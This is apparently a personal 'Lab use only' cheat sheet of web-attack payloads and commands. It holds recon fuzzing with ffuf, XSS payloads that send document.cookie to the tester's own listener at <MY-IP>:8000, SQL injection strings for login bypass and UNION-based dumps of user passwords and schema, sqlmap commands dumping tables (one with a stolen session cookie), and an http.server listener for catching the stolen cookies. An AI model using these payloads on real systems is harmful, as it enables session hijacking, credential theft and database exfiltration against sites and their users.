# 🧰 Toolbox — samples

> Lab use only. `<TARGET>`=base url · `<MY-IP>`=my lab ip · wordlist=`./common.txt`.

## Recon

```bash
curl -I <TARGET>/
curl <TARGET>/robots.txt
ffuf -u <TARGET>/FUZZ -w ./common.txt -s -t 50
ffuf -w ./common.txt -u http://<TARGET-IP>:5000/ -H "Host: FUZZ.<TARGET-DOMAIN>" -ac -t 50
python crawler.py <TARGET>
```

## XSS

```html
<script>
  alert(document.domain);
</script>
<img src="x" onerror="alert(1)" />
<img src="x" onerror="fetch('http://<MY-IP>:8000/?c='+document.cookie)" />
<script>
  new Image().src = "http://<MY-IP>:8000/c?=" + document.cookie;
</script>
```

## SQLi

```sql
admin'--
' OR '1'='1
zzz' ORDER BY 4--
zzz' UNION SELECT id, username, password, is_admin FROM users--
zzz' UNION SELECT 1, sqlite_version(), 3, 4--
zzz' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'--
```

```bash
sqlmap -u "<TARGET>/product?id=1" --level=5 --risk=3 --batch --dump -T users
sqlmap -u "<TARGET>/admin?q=a" --cookie="sid=<stolen>" -p q --level=5 --risk=3 --batch --dump -T vault
sqlmap -r req.txt --level=5 --risk=3 --batch --dump   # req.txt = full HTTP request saved from Burp/DevTools
```

## Python listener (port 8000)

```bash
python3 -m http.server 8000
```
